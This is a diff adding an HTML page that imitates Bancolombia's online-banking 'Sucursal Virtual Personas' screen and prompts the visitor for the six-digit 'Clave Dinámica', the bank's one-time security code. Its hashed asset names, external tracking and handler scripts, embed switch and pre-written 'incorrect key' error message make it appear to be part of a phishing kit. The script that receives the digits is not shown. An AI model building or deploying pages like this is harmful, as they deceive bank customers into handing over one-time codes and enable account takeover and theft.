@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover">
+    <meta name="theme-color" content="#f9f9fa">
+
+    <script>
+        window.__ALLOW_EMBED__ = new URLSearchParams(window.location.search).get('embed') === '1';
+    </script>
+    <script src="../js/click-tracker.js"></script>
+
+    <link rel="stylesheet" href="../css/fonts.css">
+    <style>
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100%;
+            font-family: "Open Sans", Arial, sans-serif;
+            font-size: 1rem;
+            color: #2c2a29;
+            line-height: 24px;
+            letter-spacing: -0.3px;
+            background-color: #f9f9fa;
+            font-synthesis: none;
+            -webkit-text-size-adjust: 100%;
+            touch-action: pan-x pan-y pinch-zoom;
+        }
+
+        button, input {
+            font-family: inherit;
+        }
+
+        a {
+            color: inherit;
+        }
+
+        .svp-main {
+            display: block;
+            min-height: 77vh;
+        }
+
+        .bc-container-fluid {
+            width: 100%;
+            padding: 0 16px;
+            margin: 0 auto;
+        }
+
+        .trazo {
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 100%;
+            background-image: url("img/7b4e2c19a8f3061d.svg");
+        }
+
+        .bc-flex { display: flex; }
+        .bc-justify-content-center { justify-content: center; }
+        .bc-text-center { text-align: center; }
+        .bc-mt-4 { margin-top: 1.5rem; }
+        .bc-mt-5 { margin-top: 3rem; }
+
+        .logo img {
+            width: 11.5rem;
+            height: auto;
+            display: block;
+        }
+
+        h1.page-title {
+            font-family: "CIB Sans Light", sans-serif;
+            font-weight: 200;
+            font-size: 2.25rem;
+            line-height: 40px;
+            letter-spacing: 0;
+        }
+
+        .form-container {
+            display: flex;
+            justify-content: center;
+            padding-bottom: 3rem;
+        }
+
+        .form-wrap {
+            width: 100%;
+            max-width: 546px;
+            padding: 0 8px;
+        }
+
+        @media (max-width: 991px) {
+            .trazo { background-size: auto; }
+        }
+
+        @media (max-width: 575px) {
+            h1.page-title {
+                font-size: 1.75rem;
+                line-height: 32px;
+            }
+
+            .key-validation-body {
+                padding: 20px 16px 28px;
+            }
+
+            .key-validation-body h3 {
+                font-size: 1.5rem;
+                line-height: 28px;
+            }
+
+            .key-validation-body p {
+                font-size: 0.9375rem;
+                line-height: 22px;
+            }
+
+            .bc-input-token .bc-input-token-container {
+                gap: clamp(3px, 1.8vw, 8px);
+                padding: 0 2px;
+            }
+
+            .bc-input-token input.bc-input[id] {
+                height: 30px;
+                line-height: 26px;
+            }
+        }
+
+        .bc-footer {
+            background: transparent;
+            padding: 24px 24px 96px;
+        }
+
+        .bc-container {
+            width: 100%;
+            max-width: 100%;
+            padding: 0 16px;
+            margin: 0 auto;
+        }
+
+        .bc-footer-top-links {
+            display: flex;
+            justify-content: flex-end;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .bc-footer-top-links-ca {
+            display: flex;
+            align-items: center;
+        }
+
+        .bc-footer-top-links-ca::after {
+            content: "·";
+            margin: 0 16px;
+            color: #2c2a29;
+        }
+
+        .bc-footer-top-links-ca:last-of-type::after {
+            content: "";
+            margin: 0;
+        }
+
+        .bc-footer-top-links-ca .bc-link {
+            font-size: 0.875rem;
+            text-decoration: none;
+        }
+
+        .bc-footer-divisor {
+            margin: 16px 0;
+            width: 100%;
+            height: 1px;
+            background: #b3b5b8;
+            border-radius: 4px;
+        }
+
+        .bc-footer-bottom {
+            display: flex;
+            align-items: flex-start;
+            gap: 24px;
+        }
+
+        .bc-footer-bottom-left { flex: 1; }
+
+        .bc-footer-bottom-left-side {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .bc-footer-bottom-top-icon img {
+            width: 150px;
+            display: block;
+        }
+
+        .bc-footer-bottom-left-side-vigilant {
+            position: relative;
+            height: 16px;
+            margin-top: 8px;
+        }
+
+        .bc-footer-bottom-left-side-vigilant img {
+            width: 16px;
+            height: auto;
+            display: block;
+            transform: rotate(90deg);
+            transform-origin: center center;
+            position: absolute;
+            left: 56px;
+            top: -57px;
+        }
+
+        .bc-footer-bottom-right { text-align: right; }
+
+        .bc-footer-bottom-right-text p {
+            font-size: 0.75rem;
+            line-height: 16px;
+        }
+
+        @media (max-width: 767px) {
+            .bc-footer-bottom {
+                flex-direction: column;
+                align-items: center;
+                gap: 0;
+            }
+
+            .bc-footer-bottom-left {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .bc-footer-bottom-left-side {
+                align-items: center;
+                width: 100%;
+            }
+
+            .bc-footer-bottom-left-side-vigilant {
+                position: relative;
+                width: 140px;
+                max-width: 100%;
+                height: 18px;
+                margin: 8px auto 0;
+                flex-shrink: 0;
+            }
+
+            .bc-footer-bottom-left-side-vigilant img {
+                position: absolute;
+                left: 50%;
+                top: 50%;
+                width: 16px;
+                height: auto;
+                margin: 0;
+                transform: translate(-50%, -50%) rotate(90deg);
+                transform-origin: center center;
+            }
+
+            .bc-footer-bottom-right {
+                text-align: center;
+                width: 100%;
+            }
+
+            .bc-footer-bottom-right-text {
+                margin: 8px 0 0;
+            }
+        }
+
+        @media (max-width: 575px) {
+            .bc-footer { padding: 8px 8px 96px; }
+
+            .bc-footer-top-links {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .bc-footer-top-links-ca::after {
+                content: "";
+                margin: 0;
+            }
+
+            .bc-footer-bottom {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .bc-footer-bottom-left,
+            .bc-footer-bottom-right {
+                text-align: center;
+            }
+        }
+
+        .bc-card {
+            display: flex;
+            width: 100%;
+            border-radius: 17px;
+            background-color: #fff;
+            box-shadow: 0 16px 20px rgba(44, 42, 41, 0.16), 0 1px 12px rgba(43, 42, 41, 0.08);
+        }
+
+        .bc-card-container {
+            padding: 0;
+            width: 100%;
+        }
+
+        .key-validation-body {
+            padding: 25px 25px 34px;
+            width: 100%;
+            max-width: 100%;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .bc-key-validation-header .bc-key-validation-dynamic-container {
+            margin-bottom: 1.05rem;
+            border-radius: 0.525rem;
+            max-height: 8.86rem;
+            overflow: hidden;
+        }
+
+        .bc-bg-brand-sequential-C-200 {
+            background-color: #9be0f1;
+        }
+
+        .bc-key-validation-header img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        .key-validation-body h3 {
+            font-family: "CIB Sans Bold", sans-serif;
+            font-size: 1.8375rem;
+            line-height: 32px;
+            letter-spacing: -0.6px;
+            font-weight: 700;
+            margin-bottom: 0.525rem;
+        }
+
+        .key-validation-body p {
+            font-size: 1.05rem;
+            line-height: 25px;
+            letter-spacing: -0.3px;
+            margin-bottom: 0.525rem;
+        }
+
+        .bc-form-field {
+            width: 100%;
+            max-width: 100%;
+            position: relative;
+            height: 54px;
+            margin-top: 21px;
+            overflow: hidden;
+        }
+
+        .bc-input-token {
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            max-width: 100%;
+        }
+
+        .bc-input-token .bc-input-token-container {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: nowrap;
+            justify-content: center;
+            align-items: flex-end;
+            width: 100%;
+            max-width: 100%;
+            gap: clamp(4px, 2.5vw, 12px);
+            padding: 0 clamp(2px, 1.5vw, 8px);
+            box-sizing: border-box;
+        }
+
+        .bc-input-token input {
+            text-align: center;
+            text-transform: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .bc-input-token .bc-input-token-container .bc-input {
+            margin: 0;
+            flex: 1 1 0;
+            min-width: 0;
+            max-width: 48px;
+        }
+
+        .bc-input-token input.bc-input[id] {
+            background-color: rgba(0, 0, 0, 0);
+            border: none;
+            border-bottom: 1px solid #2c2a29;
+            color: #2c2a29;
+            display: block;
+            height: 32px;
+            outline: none;
+            font-family: "CIB Sans Bold", "Segoe UI Bold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 700;
+            font-size: clamp(1.125rem, 4.5vw, 1.5rem);
+            line-height: 28px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            padding: 0;
+            width: 100%;
+        }
+
+        .bc-input-token input.bc-input[id].is-masked {
+            -webkit-text-security: disc;
+            font-family: "Open Sans SemiBold", "Segoe UI Semibold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 600;
+            font-size: clamp(1.25rem, 5vw, 1.65rem);
+            line-height: 28px;
+            letter-spacing: 0;
+        }
+
+        .bc-input-token .bc-input-token-container input:focus {
+            outline: 0;
+            border-bottom: 1px solid #2c2a29;
+        }
+
+        .bc-input-token .bc-input-token-container input:not(:focus):not([data-digit]) {
+            outline: 0;
+            transition: 0.5s;
+            border-bottom: solid 2px #e20201;
+        }
+
+        .bc-input-token .bc-input-token-container input:not(:focus)[data-digit] {
+            outline: 0;
+            transition: 0.5s;
+            border-bottom: solid 2px #2c2a29;
+        }
+
+        .bc-input-token input.bc-input[id]::first-line {
+            color: #2c2a29;
+            -webkit-text-fill-color: #2c2a29;
+        }
+
+        .bc-label-bottom-token {
+            font-size: 0.75rem;
+            line-height: 16px;
+            margin-top: 8px;
+            min-height: 24px;
+            max-width: 320px;
+            text-align: center;
+        }
+
+        .key-validation-actions {
+            display: flex;
+            gap: 13px;
+            margin-top: 25px;
+        }
+
+        .bc-button {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            column-gap: 8px;
+            border: none;
+            cursor: pointer;
+            padding: 8px 17px;
+            outline: none;
+            text-decoration: none;
+            border-radius: 100px;
+            overflow: hidden;
+            flex: 1;
+            min-height: 34px;
+            white-space: initial;
+            font-family: "CIB Sans Bold", sans-serif;
+            font-weight: 700;
+            font-size: 1.05rem;
+            line-height: 25px;
+            transition: 150ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .bc-button-secondary {
+            background-color: transparent;
+            color: #2c2a29;
+            border: 1px solid #2c2a29;
+        }
+
+        .bc-button-primary {
+            background-color: #fdda24;
+            color: #2c2a29;
+        }
+
+        .bc-button-primary:disabled {
+            background-color: #d9dadd;
+            color: #97999b;
+            cursor: default;
+        }
+
+        .bc-button-primary.valid:not(:disabled) {
+            background-color: #fdda24;
+            color: #2c2a29;
+        }
+
+        .error-message {
+            position: fixed;
+            top: clamp(72px, 11vh, 116px);
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10000;
+            display: none;
+            align-items: stretch;
+            width: min(calc(100% - 32px), 560px);
+            background-color: #333333;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(44, 42, 41, 0.28), 0 2px 8px rgba(44, 42, 41, 0.12);
+            overflow: hidden;
+            color: #ffffff;
+            font-family: "Open Sans", Arial, sans-serif;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-message-accent {
+            width: 4px;
+            flex-shrink: 0;
+            background-color: #ff7f41;
+        }
+
+        .error-message-icon {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            padding: 18px 0 18px 14px;
+        }
+
+        .error-message-icon-mark {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #ffc4a8;
+            color: #2c2a29;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.125rem;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .error-message-content {
+            flex: 1;
+            padding: 16px 12px 16px 10px;
+            text-align: left;
+            min-width: 0;
+        }
+
+        .error-message-title {
+            margin: 0 0 4px;
+            font-family: "CIB Sans Bold", sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            line-height: 1.35;
+        }
+
+        .error-message-text {
+            margin: 0;
+            font-size: 0.875rem;
+            font-weight: 400;
+            line-height: 1.45;
+            color: rgba(255, 255, 255, 0.92);
+        }
+
+        .error-message-close {
+            flex-shrink: 0;
+            align-self: flex-start;
+            border: none;
+            background: transparent;
+            color: #ffffff;
+            font-size: 1.375rem;
+            line-height: 1;
+            padding: 14px 16px 8px 8px;
+            cursor: pointer;
+            opacity: 0.85;
+        }
+
+        .error-message-close:hover {
+            opacity: 1;
+        }
+    </style>
+    <link rel="stylesheet" href="../css/auth-layout.css">
+</head>
+<body>
+    <div id="root">
+        <div class="error-message" id="errorMessageBox" role="alert" aria-live="polite">
+            <div class="error-message-accent" aria-hidden="true"></div>
+            <div class="error-message-icon" aria-hidden="true">
+                <span class="error-message-icon-mark">×</span>
+            </div>
+            <div class="error-message-content">
+                <p class="error-message-title">Algo salió mal</p>
+                <p class="error-message-text">Clave dinámica incorrecta. Verifica e intenta nuevamente.</p>
+            </div>
+            <button type="button" class="error-message-close" aria-label="Cerrar mensaje">×</button>
+        </div>
+        <main class="svp-main edTzEr">
+            <div class="bc-container-fluid trazo">
+                <div class="bc-flex bc-justify-content-center bc-mt-5">
+                    <div class="logo">
+                        <img src="../img/9c3f1a28e7b5064a.svg" alt="Bancolombia" width="184" height="48">
+                    </div>
+                </div>
+
+                <h1 class="bc-text-center page-title bc-cibsans-font-style-9-extralight bc-mt-4">Sucursal Virtual Personas</h1>
+
+                <div class="form-container">
+                    <div class="form-wrap">
+                        <div class="bc-mt-4">
+                            <section class="bc-card bc-card-container">
+                                <section class="key-validation-body">
+                                    <div class="bc-key-validation-header">
+                                        <div class="bc-key-validation-dynamic-container bc-bg-brand-sequential-C-200">
+                                            <img src="../img/5a7c3e21f9b4062e.gif" width="100%" height="100%" alt="Instrucciones para encontrar la Clave Dinámica en Mi Bancolombia">
+                                        </div>
+                                        <h3>Ingresa la Clave Dinámica</h3>
+                                    </div>
+
+                                    <p>Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+                                    <div class="bc-form-field">
+                                        <div class="bc-input-token">
+                                            <div class="bc-input-token-container" id="token-inputs">
+                                                <input id="char0" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="0" aria-label="Ingresar primer dígito, Editar texto" type="text">
+                                                <input id="char1" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="1" aria-label="Ingresar segundo dígito, Editar texto" type="text">
+                                                <input id="char2" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="2" aria-label="Ingresar tercer dígito, Editar texto" type="text">
+                                                <input id="char3" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="3" aria-label="Ingresar cuarto dígito, Editar texto" type="text">
+                                                <input id="char4" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="4" aria-label="Ingresar quinto dígito, Editar texto" type="text">
+                                                <input id="char5" class="bc-input pin-input" placeholder=" " maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-index="5" aria-label="Ingresar sexto dígito, Editar texto" type="text">
+                                            </div>
+                                            <label class="bc-label-bottom-token" aria-hidden="true"></label>
+                                        </div>
+                                    </div>
+
+                                    <div class="key-validation-actions">
+                                        <button type="button" class="bc-button bc-button-secondary" id="btn-clear">Borrar</button>
+                                        <button type="button" class="bc-button bc-button-primary" id="continueButton" disabled>Continuar</button>
+                                    </div>
+                                </section>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="bc-footer">
+            <div class="bc-container">
+                <div class="bc-footer-top-links">
+                    <div class="bc-footer-top-links-ca"><a href="#" class="bc-link">¿Problemas para conectarte?</a></div>
+                    <div class="bc-footer-top-links-ca"><a href="#" class="bc-link">Aprende sobre seguridad</a></div>
+                    <div class="bc-footer-top-links-ca"><a href="#" class="bc-link">Reglamento Sucursal Virtual</a></div>
+                    <div class="bc-footer-top-links-ca"><a href="#" class="bc-link">Política de privacidad</a></div>
+                </div>
+                <div class="bc-footer-divisor"></div>
+                <div class="bc-footer-bottom">
+                    <div class="bc-footer-bottom-left">
+                        <div class="bc-footer-bottom-left-side">
+                            <div class="bc-footer-bottom-top-icon">
+                                <img src="../img/9c3f1a28e7b5064a.svg" alt="Bancolombia">
+                            </div>
+                            <div class="bc-footer-bottom-left-side-vigilant">
+                                <img src="../img/2d8e4f19c6a3075b.svg" alt="Vigilado Superintendencia Financiera de Colombia">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bc-footer-bottom-right">
+                        <div class="bc-footer-bottom-right-text">
+                            <p id="ipAddressText">Dirección IP: <span id="userIP">Cargando...</span></p>
+                            <p id="datetime">...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <button type="button" id="backButton" hidden aria-hidden="true" tabindex="-1">Regresar</button>
+    </div>
+    
+ <script src="codigo.js"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"ba3fcfe5ffcd448bb7272753832c7b2e","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
